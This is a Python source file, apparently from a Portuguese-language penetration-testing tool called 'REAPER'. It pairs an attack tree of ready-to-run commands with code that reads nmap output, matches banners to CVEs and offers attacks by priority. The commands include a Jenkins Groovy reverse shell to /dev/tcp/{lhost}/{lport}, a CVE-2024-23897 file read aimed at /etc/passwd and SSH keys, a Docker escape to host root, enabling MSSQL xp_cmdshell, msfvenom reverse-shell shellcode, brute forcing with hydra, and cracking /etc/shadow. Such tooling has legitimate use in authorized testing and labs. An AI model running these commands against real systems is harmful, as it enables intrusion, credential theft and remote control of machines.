                "cmd": "nmap -p 27017 --script mongodb-info,mongodb-databases {alvo}",
                "followup": {"success": ["mongodb_dump"], "fail": []},
                "hints": "Mostra versão, bases de dados e configuração"
            },
        ]
    },

    # ── Jenkins ───────────────────────────────────────────────
    "jenkins": {
        "label": "Jenkins",
        "color": "bright_red",
        "icon": "⚙️",
        "detect": lambda ports, banners: any(p in ports for p in ["8080","8443","50000"]) and "jenkins" in banners,
        "attacks": [
            {
                "name": "Jenkins — acesso anónimo ao painel",
                "desc": "Verificar se o Jenkins permite acesso sem login",
                "params": [{"key": "url", "label": "URL Jenkins", "default": "http://{TARGET}:8080"}],
                "cmd": "curl -s {url}/api/json?pretty=true | head -30",
                "followup": {"success": ["jenkins_groovy"], "fail": ["jenkins_brute"]},
                "hints": "Se retornar JSON sem erro — tens acesso anónimo.\nNavega para {url}/script para o Groovy console"
            },
            {
                "name": "Jenkins — RCE via Groovy Script Console",
                "desc": "Executar código Groovy arbitrário (requer acesso admin)",
                "params": [
                    {"key": "url",   "label": "URL Jenkins",      "default": "http://{TARGET}:8080"},
                    {"key": "lhost", "label": "Teu IP",           "default": ""},
                    {"key": "lport", "label": "Porta listener",   "default": "4444"},
                ],
                "cmd": "curl -s -X POST '{url}/scriptText' --data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"].execute()'",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Também podes ir manualmente a /script e colar:\nThread.start {{ [\'bash\',\'-c\',\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'].execute() }}"
            },
            {
                "name": "Jenkins — brute force login",
                "desc": "Força bruta ao painel Jenkins",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} -s 8080 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username' {alvo}",
                "followup": {"success": ["jenkins_groovy"], "fail": []},
                "hints": "Users comuns: admin, jenkins, administrator, root"
            },
            {
                "name": "Jenkins CVE-2024-23897 — LFI/RCE",
                "desc": "Leitura de ficheiros sem autenticação — Jenkins < 2.441",
                "params": [
                    {"key": "url",      "label": "URL Jenkins",           "default": "http://{TARGET}:8080"},
                    {"key": "ficheiro", "label": "Ficheiro a ler",        "default": "/etc/passwd"},
                ],
                "cmd": "curl -s '{url}/cli?remoting=false' -H 'Session: x' -H 'Side-Channel-Command: 1' --data-binary '@{ficheiro}'",
                "followup": {"success": ["jenkins_groovy"], "fail": []},
                "hints": "CVE crítico de 2024. Tenta ler /etc/passwd, /root/.ssh/id_rsa, secrets do Jenkins"
            },
        ]
    },

    # ── VNC ───────────────────────────────────────────────────
    "vnc": {
        "label": "VNC",
        "color": "cyan",
        "icon": "🖥️",
        "detect": lambda ports, banners: any(p in ports for p in ["5900","5901","5902","5903"]) or "vnc" in banners,
        "attacks": [
            {
                "name": "VNC — acesso sem password",
                "desc": "Tentar ligar ao VNC sem autenticação",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "vncviewer {alvo}:5900",
                "followup": {"success": ["privesc_tree"], "fail": ["vnc_brute"]},
                "hints": "Se pedir password tenta: (vazio), password, admin, 1234, root\nAlternativa headless: xdotool"
            },
            {
                "name": "VNC — brute force (hydra)",
                "desc": "Força bruta à password VNC",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -P {wordlist} vnc://{alvo}",
                "followup": {"success": ["vnc_connect"], "fail": []},
                "hints": "VNC usa só password, sem username.\nTambém: ncrack -p 5900 --passwords rockyou.txt {alvo}"
            },
            {
                "name": "VNC — nmap enum",
                "desc": "Detectar versão e autenticação VNC",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "nmap -p 5900-5910 --script vnc-info,vnc-brute {alvo}",
                "followup": {"success": ["vnc_connect"], "fail": []},
                "hints": "Procura: VNC Authentication None — acesso directo sem password"
            },
        ]
    },

    # ── Telnet ────────────────────────────────────────────────
    "telnet": {
        "label": "Telnet",
        "color": "yellow",
        "icon": "📟",
        "detect": lambda ports, banners: "23" in ports or "telnet" in banners,
        "attacks": [
            {
                "name": "Telnet — ligar e testar credenciais padrão",
                "desc": "Acesso interactivo via Telnet",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "telnet {alvo}",
                "followup": {"success": ["privesc_tree"], "fail": ["telnet_brute"]},
                "hints": "Credenciais padrão: admin:admin, root:root, admin:(vazio), guest:guest"
            },
            {
                "name": "Telnet — brute force (hydra)",
                "desc": "Força bruta às credenciais Telnet",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "admin"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} telnet://{alvo}",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Telnet transmite tudo em claro — captura com tcpdump se estiveres na mesma rede"
            },
        ]
    },

    # ── LDAP / Active Directory ───────────────────────────────
    "ldap": {
        "label": "LDAP / Active Directory",
        "color": "bright_blue",
        "icon": "🏢",
        "detect": lambda ports, banners: any(p in ports for p in ["389","636","3268","3269","88"]) or
            any(s in banners for s in ["ldap","active directory","kerberos","domain"]),
        "attacks": [
            {
                "name": "LDAP — enumeração anónima",
                "desc": "Extrair informação AD sem credenciais",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",           "default": "{TARGET}"},
                    {"key": "domain", "label": "Domínio (ex: htb.local)", "default": ""},
                ],
                "cmd": "ldapsearch -x -H ldap://{alvo} -b 'dc={domain}' '(objectClass=*)' 2>/dev/null | head -100",
                "followup": {"success": ["ldap_users", "bloodhound"], "fail": ["ldap_brute"]},
                "hints": "Domínio htb.local → -b 'dc=htb,dc=local'\nProcura: utilizadores, grupos, descrições com passwords"
            },
            {
                "name": "ldapdomaindump — dump completo AD",
                "desc": "Extrair todos os objectos AD para HTML/JSON",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",       "default": "{TARGET}"},
                    {"key": "domain", "label": "Domínio\\user", "default": ""},
                    {"key": "pass_",  "label": "Password",      "default": ""},
                    {"key": "output", "label": "Pasta output",  "default": "./ldap_dump"},
                ],
                "cmd": "ldapdomaindump -u '{domain}' -p '{pass_}' {alvo} -o {output}",
                "followup": {"success": ["bloodhound"], "fail": []},
                "hints": "Gera ficheiros HTML navegáveis com todos os users, grupos e GPOs"
            },
            {
                "name": "BloodHound — mapeamento AD",
                "desc": "Mapear caminhos de escalada no Active Directory",
                "params": [
                    {"key": "domain", "label": "Domínio",      "default": ""},
                    {"key": "user",   "label": "Utilizador",   "default": ""},
                    {"key": "pass_",  "label": "Password",     "default": ""},
                    {"key": "alvo",   "label": "IP DC",        "default": "{TARGET}"},
                ],
                "cmd": "bloodhound-python -d {domain} -u {user} -p {pass_} -ns {alvo} -c all",
                "followup": {"success": [], "fail": []},
                "hints": "Importa os ficheiros .json gerados para o BloodHound GUI\nProcura: Shortest Paths to Domain Admins"
            },
            {
                "name": "AS-REP Roasting",
                "desc": "Extrair hashes de contas sem pre-autenticação Kerberos",
                "params": [
                    {"key": "domain", "label": "Domínio",      "default": ""},
                    {"key": "alvo",   "label": "IP DC",        "default": "{TARGET}"},
                    {"key": "output", "label": "Ficheiro output","default": "asrep.txt"},
                ],
                "cmd": "impacket-GetNPUsers {domain}/ -dc-ip {alvo} -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/Names/names.txt -outputfile {output}",
                "followup": {"success": ["crack_kerberos"], "fail": ["kerberoasting"]},
                "hints": "Crackear os hashes:\nhashcat -m 18200 {output} /usr/share/wordlists/rockyou.txt"
            },
        ]
    },

    # ── Docker ────────────────────────────────────────────────
    "docker": {
        "label": "Docker",
        "color": "bright_blue",
        "icon": "🐳",
        "detect": lambda ports, banners: any(p in ports for p in ["2375","2376","2377"]) or "docker" in banners,
        "attacks": [
            {
                "name": "Docker API — acesso sem TLS",
                "desc": "Ligar ao Docker daemon exposto sem autenticação",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "docker -H tcp://{alvo}:2375 ps && docker -H tcp://{alvo}:2375 images",
                "followup": {"success": ["docker_escape"], "fail": []},
                "hints": "Se listar containers — tens controlo total do Docker daemon"
            },
            {
                "name": "Docker — escape para root do host",
                "desc": "Montar filesystem do host via container privilegiado",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "docker -H tcp://{alvo}:2375 run -it --rm -v /:/mnt alpine chroot /mnt sh",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Este comando monta / do host dentro do container — tens acesso root total ao sistema"
            },
            {
                "name": "Docker — escape via socket local",
                "desc": "Escape de container via /var/run/docker.sock",
                "params": [],
                "cmd": "ls -la /var/run/docker.sock && docker run -it --rm -v /:/mnt alpine chroot /mnt sh",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Se o socket existir e for writable — és root no host\nVerifica com: find / -name docker.sock 2>/dev/null"
            },
        ]
    },

    # ── MSSQL ─────────────────────────────────────────────────
    "mssql": {
        "label": "MSSQL (SQL Server)",
        "color": "bright_red",
        "icon": "🗃️",
        "detect": lambda ports, banners: "1433" in ports or "mssql" in banners or "sql server" in banners,
        "attacks": [
            {
                "name": "MSSQL — login SA sem password",
                "desc": "Tentar acesso com conta SA padrão",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "impacket-mssqlclient sa@{alvo} -windows-auth",
                "followup": {"success": ["mssql_xpcmdshell"], "fail": ["mssql_brute"]},
                "hints": "Tenta também: sa:(vazio), sa:sa, sa:password, sa:admin"
            },
            {
                "name": "MSSQL — RCE via xp_cmdshell",
                "desc": "Executar comandos OS via xp_cmdshell",
                "params": [
                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user", "label": "Utilizador", "default": "sa"},
                    {"key": "pass_","label": "Password",   "default": ""},
                ],
                "cmd": "impacket-mssqlclient {user}:{pass_}@{alvo} -windows-auth",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "Após login:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';"
            },
            {
                "name": "MSSQL — brute force (hydra)",
                "desc": "Força bruta às credenciais MSSQL",
                "params": [
                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "user",     "label": "Utilizador", "default": "sa"},
                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hydra -l {user} -P {wordlist} mssql://{alvo}",
                "followup": {"success": ["mssql_xpcmdshell"], "fail": []},
                "hints": "Também: msfconsole → use auxiliary/scanner/mssql/mssql_login"
            },
        ]
    },

    # ── Oracle DB ─────────────────────────────────────────────
    "oracle": {
        "label": "Oracle DB",
        "color": "red",
        "icon": "🔮",
        "detect": lambda ports, banners: "1521" in ports or "oracle" in banners or "tnslsnr" in banners,
        "attacks": [
            {
                "name": "Oracle — enumerar SID",
                "desc": "Descobrir o SID (nome da base de dados Oracle)",
                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/oracle/sid_enum; set RHOSTS {alvo}; run'",
                "followup": {"success": ["oracle_brute"], "fail": []},
                "hints": "SIDs comuns: ORCL, XE, PROD, TEST, DB, ORACLE\nTambém: tnscmd10g version -h {alvo}"
            },
            {
                "name": "Oracle — brute force credenciais",
                "desc": "Força bruta com SID encontrado",
                "params": [
                    {"key": "alvo", "label": "IP alvo",  "default": "{TARGET}"},
                    {"key": "sid",  "label": "SID",      "default": "ORCL"},
                ],
                "cmd": "msfconsole -q -x 'use auxiliary/scanner/oracle/oracle_login; set RHOSTS {alvo}; set SID {sid}; run'",
                "followup": {"success": ["oracle_rce"], "fail": []},
                "hints": "Credenciais padrão: sys:change_on_install, system:manager, scott:tiger, dbsnmp:dbsnmp"
            },
            {
                "name": "Oracle — RCE via ODAT",
                "desc": "Execução de comandos via Oracle Database Attack Tool",
                "params": [
                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
                    {"key": "sid",  "label": "SID",        "default": "ORCL"},
                    {"key": "user", "label": "Utilizador", "default": "scott"},
                    {"key": "pass_","label": "Password",   "default": "tiger"},
                ],
                "cmd": "odat all -s {alvo} -d {sid} -U {user} -P {pass_}",
                "followup": {"success": ["privesc_tree"], "fail": []},
                "hints": "ODAT testa automaticamente: upload, exec, privesc, passwords\nInstalar: pip install odat"
            },
        ]
    },

    # ── Buffer Overflow ───────────────────────────────────────
    "bof": {
        "label": "Buffer Overflow",
        "color": "bright_red",
        "icon": "💣",
        "detect": lambda ports, banners: False,  # activado manualmente
        "attacks": [
            {
                "name": "Fuzzing — encontrar offset do crash",
                "desc": "Enviar payload crescente até crashar o serviço",
                "params": [
                    {"key": "alvo",  "label": "IP alvo",      "default": "{TARGET}"},
                    {"key": "porto", "label": "Porto serviço", "default": ""},
                ],
                "cmd": "python3 fuzzer.py  # Ver hints para o script",
                "followup": {"success": ["bof_pattern"], "fail": []},
                "hints": "Começa com 100, depois 500, 1000, 2000, 5000 bytes\nUsa Immunity Debugger + Mona no Windows para ver EIP"
            },
            {
                "name": "Pattern Create — encontrar offset exacto",
                "desc": "Gerar padrão único para identificar offset do EIP",
                "params": [
                    {"key": "tamanho", "label": "Tamanho do padrão (usa valor do crash)", "default": "3000"},
                ],
                "cmd": "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {tamanho}",
                "followup": {"success": ["bof_offset"], "fail": []},
                "hints": "Envia o padrão, regista o valor em EIP, depois usa pattern_offset"
            },
            {
                "name": "Pattern Offset — calcular offset",
                "desc": "Calcular offset exacto a partir do valor em EIP",
                "params": [
                    {"key": "eip",    "label": "Valor de EIP (ex: 41326241)", "default": ""},
                    {"key": "tamanho","label": "Tamanho do padrão",           "default": "3000"},
                ],
                "cmd": "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {tamanho} -q {eip}",
                "followup": {"success": ["bof_badchars"], "fail": []},
                "hints": "O offset diz-te quantos bytes antes de sobrescrever EIP"
            },
            {
                "name": "Bad chars — identificar caracteres proibidos",
                "desc": "Encontrar bytes que o serviço filtra/corrompe",
                "params": [
                    {"key": "alvo",   "label": "IP alvo",      "default": "{TARGET}"},
                    {"key": "porto",  "label": "Porto serviço", "default": ""},
                    {"key": "offset", "label": "Offset calculado", "default": ""},
                ],
                "cmd": "python3 badchars.py  # Ver hints para criar o script",
                "followup": {"success": ["bof_jmp_esp"], "fail": []},
                "hints": "Compara o dump de memória com os bytes enviados\n\x00 é quase sempre bad char"
            },
            {
                "name": "Gerar shellcode com msfvenom",
                "desc": "Criar shellcode sem os bad chars identificados",
                "params": [
                    {"key": "lhost",    "label": "Teu IP",          "default": ""},
                    {"key": "lport",    "label": "Porta listener",  "default": "4444"},
                    {"key": "badchars", "label": "Bad chars (ex: \\x00\\x0a)", "default": "\\x00"},
                    {"key": "platform", "label": "Plataforma (windows/linux)", "default": "windows"},
                ],
                "cmd": "msfvenom -p {platform}/shell_reverse_tcp LHOST={lhost} LPORT={lport} -b '{badchars}' -f python -v shellcode",
                "followup": {"success": ["bof_exploit"], "fail": []},
                "hints": "Adiciona NOP sled antes do shellcode: b'\\x90'*16 + shellcode"
            },
        ]
    },
    # ── Cracking de Hashes ───────────────────────────────────
    "hashes": {
        "label": "Cracking de Hashes",
        "color": "yellow",
        "icon": "🔓",
        "detect": lambda ports, banners: False,
        "attacks": [
            {
                "name": "John the Ripper",
                "desc": "Crackear hashes com dicionário",
                "params": [
                    {"key": "hash_file","label": "Ficheiro com hash(es)", "default": "hash.txt"},
                    {"key": "wordlist", "label": "Wordlist",              "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "john --wordlist={wordlist} {hash_file} && john --show {hash_file}",
                "followup": {"success": [], "fail": ["hashcat"]},
                "hints": "Para identificar o tipo: hash-identifier <hash>"
            },
            {
                "name": "Hashcat — GPU cracking",
                "desc": "Crackear hashes com GPU (mais rápido)",
                "params": [
                    {"key": "modo",     "label": "Modo: 0=MD5 100=SHA1 1800=sha512crypt 3200=bcrypt", "default": "0"},
                    {"key": "hash_file","label": "Ficheiro com hash", "default": "hash.txt"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
                "followup": {"success": [], "fail": []},
                "hints": "Para identificar modo: hashcat --example-hashes | grep -i <tipo>"
            },
            {
                "name": "Unshadow + John",
                "desc": "Combinar passwd+shadow e crackear",
                "params": [
                    {"key": "passwd",   "label": "Ficheiro /etc/passwd", "default": "/etc/passwd"},
                    {"key": "shadow",   "label": "Ficheiro /etc/shadow", "default": "/etc/shadow"},
                    {"key": "wordlist", "label": "Wordlist",             "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "unshadow {passwd} {shadow} > combined.txt && john --wordlist={wordlist} combined.txt",
                "followup": {"success": [], "fail": []},
                "hints": "Após crackear: john --show combined.txt"
            },
        ]
    },
}

# ═══════════════════════════════════════════════════════════
#  FUNÇÕES DO MOTOR DE INTELIGÊNCIA
# ═══════════════════════════════════════════════════════════

# ── Base de CVEs / prioridade por versão ────────────────────
CVE_SIGNATURES = [
    # (regex_para_banner, vector_key, prioridade, cve, descricao_curta)
    (r"vsftpd 2\.3\.4",               "ftp",       1, "CVE-2011-2523",  "Backdoor directo — shell root sem auth"),
    (r"proftpd 1\.3\.5",              "ftp",       1, "CVE-2015-3306",  "mod_copy RCE sem autenticação"),
    (r"openssh 7\.([0-6])",            "ssh",       3, "CVE-2016-6210",  "User enumeration via timing attack"),
    (r"openssh 2\.([0-9])",            "ssh",       2, "CVE-2001-0572",  "Versão muito antiga — múltiplos exploits"),
    (r"apache[/ ]2\.4\.4[89]",        "apache",    1, "CVE-2021-41773", "Path Traversal RCE sem autenticação"),
    (r"apache[/ ]2\.4\.50",           "apache",    1, "CVE-2021-42013", "Path Traversal RCE (bypass do fix anterior)"),
    (r"apache[/ ]2\.2\.",             "apache",    2, "CVE-2017-7679",  "Buffer overflow — versão muito antiga"),
    (r"apache tomcat[/ ]([0-9\.]+)",   "apache",    2, "CVE-2020-1938",  "Ghostcat — LFI via AJP porto 8009"),
    (r"iis[/ ]([0-9]+)",                "http",      3, "CVE-2017-7269",  "WebDAV buffer overflow (IIS 6.0)"),
    (r"php[/ ]([5-7])\.([0-6])",       "http",      2, "CVE-varies",     "Versão PHP desactualizada — múltiplos CVEs"),
    (r"wordpress",                       "wordpress", 2, "CVE-varies",     "WordPress detectado — enumerar plugins/users"),
    (r"drupal",                          "drupal",    1, "CVE-2018-7600",  "Drupalgeddon2 — RCE sem autenticação"),
    (r"joomla",                          "http",      2, "CVE-varies",     "Joomla detectado — verificar versão"),
    (r"samba[/ ]([0-9]+)",              "smb",       2, "CVE-2017-7494",  "SambaCry — RCE via pipe"),
    (r"windows.*smb|microsoft.*smb",    "smb",       1, "CVE-2017-0144",  "EternalBlue — verificar patch MS17-010"),
    (r"microsoft rdp|ms-wbt-server",    "rdp",       2, "CVE-2019-0708",  "BlueKeep — verificar patch"),
    (r"mysql[/ ]([0-9]+)",              "sql",       2, "CVE-varies",     "MySQL exposto — testar sem password"),
    (r"microsoft sql server",           "mssql",     2, "CVE-varies",     "MSSQL exposto — testar SA sem password"),
    (r"oracle",                          "oracle",    2, "CVE-varies",     "Oracle DB exposto — enumerar SID"),
    (r"redis",                           "redis",     1, "CVE-2022-0543",  "Redis sem auth — RCE via Lua"),
    (r"mongodb",                         "mongodb",   2, "CVE-varies",     "MongoDB — testar acesso sem auth"),
    (r"jenkins",                         "jenkins",   1, "CVE-2024-23897", "Jenkins < 2.441 — LFI/RCE sem auth"),
    (r"docker",                          "docker",    1, "CVE-varies",     "Docker API exposto — escape para host"),
    (r"vnc",                             "vnc",       2, "CVE-varies",     "VNC exposto — testar sem password"),
    (r"telnet",                          "telnet",    3, "CVE-varies",     "Telnet — credenciais em claro"),
    (r"snmp",                            "snmp",      3, "CVE-varies",     "SNMP — community string padrão"),
    (r"ldap|active.directory",           "ldap",      2, "CVE-varies",     "LDAP/AD — enumeração anónima"),
    (r"nfs|rpcbind",                     "nfs",       2, "CVE-varies",     "NFS exposto — listar exports"),
    (r"smtp|sendmail|postfix",           "mail",      3, "CVE-varies",     "SMTP — enumerar utilizadores"),
    (r"log4j|log4shell",                 "apache",    1, "CVE-2021-44228", "Log4Shell — CVSS 10.0 RCE"),
    (r"shellshock|bash 4\.[0-3]",      "apache",    1, "CVE-2014-6271",  "Shellshock — RCE via env vars"),
    (r"heartbleed|openssl 1\.0\.[01]","apache",    1, "CVE-2014-0160",  "Heartbleed — leitura de memória SSL"),
]

PRIORITY_LABEL = {
    1: ("[bold red]🔴 CRÍTICO[/bold red]",   "red"),
    2: ("[bold yellow]🟠 ALTO[/bold yellow]", "yellow"),
    3: ("[bold cyan]🟡 MÉDIO[/bold cyan]",   "cyan"),
    4: ("[dim]🟢 BAIXO[/dim]",               "dim"),
}

def detect_vectors(scan_output, target):
    """Analisa output do nmap — detecta vectores e atribui prioridade por CVE/versão."""
    ports_found = re.findall(r"(\d+)/tcp\s+open", scan_output)
    ports_found += re.findall(r"(\d+)/udp\s+open", scan_output)
    banners = scan_output.lower()

    # Detectar vectores base
    detected_keys = set()
    for key, vector in ATTACK_TREE.items():
        if key in ("privesc", "hashes", "bof"):
            continue
        try:
            if vector["detect"](ports_found, banners):
                detected_keys.add(key)
        except Exception:
            pass

    # Enriquecer com CVEs e prioridade
    enriched = {}   # key -> {priority, cves: [{cve, desc}], services: [str]}

    # Primeiro passa — prioridade base por detecção de porto
    for key in detected_keys:
        enriched[key] = {"priority": 4, "cves": [], "services": [], "recommended": False}

    # Segundo passa — cruzar banners com assinaturas CVE
    for pattern, vkey, priority, cve, desc in CVE_SIGNATURES:
        if re.search(pattern, banners, re.IGNORECASE):
            if vkey not in enriched:
                enriched[vkey] = {"priority": 4, "cves": [], "services": [], "recommended": False}
                detected_keys.add(vkey)
            if priority < enriched[vkey]["priority"]:
                enriched[vkey]["priority"] = priority
            if cve not in [c["cve"] for c in enriched[vkey]["cves"]]:
                enriched[vkey]["cves"].append({"cve": cve, "desc": desc})

    # Extrair serviços do output nmap
    service_lines = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", scan_output)
    for port, svc, version in service_lines:
        for key in enriched:
            v = ATTACK_TREE.get(key, {})
            try:
                if v.get("detect") and v["detect"]([port], (svc + " " + version).lower()):
                    entry = f"{port}/tcp {svc} {version}".strip()
                    if entry not in enriched[key]["services"]:
                        enriched[key]["services"].append(entry)
            except Exception:
                pass

    # Ordenar por prioridade
    sorted_keys = sorted(enriched.keys(), key=lambda k: enriched[k]["priority"])

    # Marcar o mais recomendado
    if sorted_keys:
        enriched[sorted_keys[0]]["recommended"] = True

    return sorted_keys, ports_found, enriched

def intelligence_menu(project, save_fn, color="red"):
    """Menu principal do motor de inteligência."""
    target = project.get("target", "")

    while True:
        console.clear()
        _banner_intel()

        console.print(Panel(
            f"[bold]Alvo:[/bold] [yellow]{target}[/yellow]",
            title="[bold red]🧠 MOTOR DE INTELIGÊNCIA[/bold red]",
            border_style="red", padding=(0,2)
        ))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style="bold cyan", width=6)
        menu.add_column()
        menu.add_row("[1]", "Correr nmap agora — análise automática em tempo real")
        menu.add_row("[2]", "Carregar scan anterior guardado")
        menu.add_row("[3]", "Escolher vector manualmente")
        menu.add_row("[4]", "Escalada de Privilégios (após acesso inicial)")
        menu.add_row("[5]", "Cracking de Hashes")
        menu.add_row("[6]", "Buffer Overflow")
        menu.add_row("[B]", "Voltar")
        console.print(menu)
        console.print()

        ch = Prompt.ask("[bold red]REAPER › Intel[/bold red]").strip().upper()

        if ch == "B":
            break
        elif ch == "1":
            scan_output = _run_nmap_live(project, save_fn)
            if scan_output:
                _auto_detect_and_attack(scan_output, target, project, save_fn)
        elif ch == "2":
            scan_output = _load_saved_scan(project)
            if scan_output:
                _auto_detect_and_attack(scan_output, target, project, save_fn)
        elif ch == "3":
            _manual_vector_menu(target, project, save_fn)
        elif ch == "4":
            _attack_vector_menu("privesc", target, project, save_fn)
        elif ch == "5":
            _attack_vector_menu("hashes", target, project, save_fn)
        elif ch == "6":
            _attack_vector_menu("bof", target, project, save_fn)

def _banner_intel():
    from rich.align import Align
    from rich.text import Text
    console.print(Align.center(Text("[ REAPER — INTELLIGENCE ENGINE ]", style="bold red")))
    console.print(Rule(style="red"))

def _run_nmap_live(project, save_fn):
    """Corre nmap em tempo real, mostra output e guarda automaticamente."""
    target = project.get("target", "")
    console.print()
    console.print(Panel(
        f"[cyan]Scan nmap ao alvo:[/cyan] [bold yellow]{target}[/bold yellow]",
        border_style="cyan"
    ))
    console.print()

    # Escolher tipo de scan
    t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    t.add_column(style="bold cyan", width=6); t.add_column()
    t.add_row("[1]", "Rápido  — Top 1000 portos  (nmap -sV -sC)")
    t.add_row("[2]", "Completo — Todos os portos  (nmap -sV -sC -p-)")
    t.add_row("[3]", "Agressivo — Completo + scripts vuln  (nmap -A -p-)")
    t.add_row("[4]", "UDP — Top 100 UDP  (nmap -sU --top-ports 100)")
    t.add_row("[B]", "Cancelar")
    console.print(t)

    ch = Prompt.ask("[cyan]Tipo de scan[/cyan]").strip().upper()
    if ch == "B":
        return None

    scan_cmds = {
        "1": f"nmap -sV -sC -T4 {target}",
        "2": f"nmap -sV -sC -p- -T4 {target}",
        "3": f"nmap -A -p- -T4 {target}",
        "4": f"nmap -sU --top-ports 100 -T4 {target}",
    }
    cmd = scan_cmds.get(ch, scan_cmds["1"])

    # Ficheiro de output automático
    import datetime as _dt
    safe_target = target.replace(".", "_").replace("/", "_")
    ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = f"nmap_{safe_target}_{ts}.txt"

    full_cmd = cmd + f" -oN {outfile}"

    console.print(f"\n[yellow]A correr:[/yellow] [bold green]{full_cmd}[/bold green]")
    console.print(f"[dim]Output guardado em: {outfile}[/dim]\n")
    console.print(Rule(style="dim green"))

    output_lines = []
    try:
        proc = subprocess.Popen(
            full_cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        for line in proc.stdout:
            print(line, end="", flush=True)
            output_lines.append(line)
        proc.wait()
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrompido. A voltar ao menu...[/yellow]")
        try:
            proc.terminate()
        except Exception:
            pass
    except Exception as _ex:
        console.print(f"\n[red]Erro durante o scan: {_ex}[/red]")

    console.print(Rule(style="dim green"))
    scan_output = "".join(output_lines)

    # Guardar referência no projecto
    project["phases"]["2"]["notas"] = (
        project["phases"]["2"].get("notas", "") +
        f"\n[nmap] {full_cmd} → {outfile}"
    ).strip()
    save_fn()

    console.print(f"\n[green]✔ Scan concluído — guardado em {outfile}[/green]")
    _pause()
    return scan_output


def _load_saved_scan(project):
    """Carrega scan nmap anteriormente guardado."""
    from pathlib import Path as _Path
    scans = list(_Path(".").glob("nmap_*.txt"))
    if not scans:
        console.print("[yellow]Nenhum scan guardado encontrado nesta directoria.[/yellow]")
        _pause()
        return None

    t = Table(box=box.SIMPLE_HEAD, border_style="dim")
    t.add_column("#", style="bold cyan", width=4)
    t.add_column("Ficheiro")
    t.add_column("Modificado", style="dim")
    for i, f in enumerate(scans, 1):
        import datetime as _dt
        mtime = _dt.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        t.add_row(str(i), f.name, mtime)

    console.print(t)
    ch = Prompt.ask("[cyan]Número (ENTER para cancelar)[/cyan]", default="").strip()
    if ch.isdigit() and 1 <= int(ch) <= len(scans):
        with open(scans[int(ch)-1]) as f:
            return f.read()
    return None

def _auto_detect_and_attack(scan_output, target, project, save_fn):
    """Detecta vectores, enriquece com CVEs e apresenta por prioridade."""
    detected, ports, enriched = detect_vectors(scan_output, target)

    console.clear()
    _banner_intel()

    if not detected:
        console.print(Panel(
            "[yellow]Nenhum vector conhecido detectado automaticamente.\n"
            "Usa a opção 'Escolher vector manualmente'.[/yellow]",
            border_style="yellow"
        ))
        _pause()
        return

    # Guardar vectores detectados no projecto
    project["phases"]["2"]["servicos"] = ", ".join(
        ATTACK_TREE[k]["label"] for k in detected
    )
    save_fn()

    def _build_table():
        t = Table(box=box.ROUNDED, border_style="red",
                  header_style="bold red", show_lines=True, title="[bold red]VECTORES DETECTADOS[/bold red]")
        t.add_column("#",          style="bold white",  width=4,  justify="center")
        t.add_column("Prioridade", width=16)
        t.add_column("Vector",     style="bold white",  width=20)
        t.add_column("Serviço / Versão", style="dim white", width=28)
        t.add_column("CVE / Risco",      style="yellow",    width=32)

        for i, key in enumerate(detected, 1):
            v    = ATTACK_TREE[key]
            info = enriched[key]
            pri  = info["priority"]
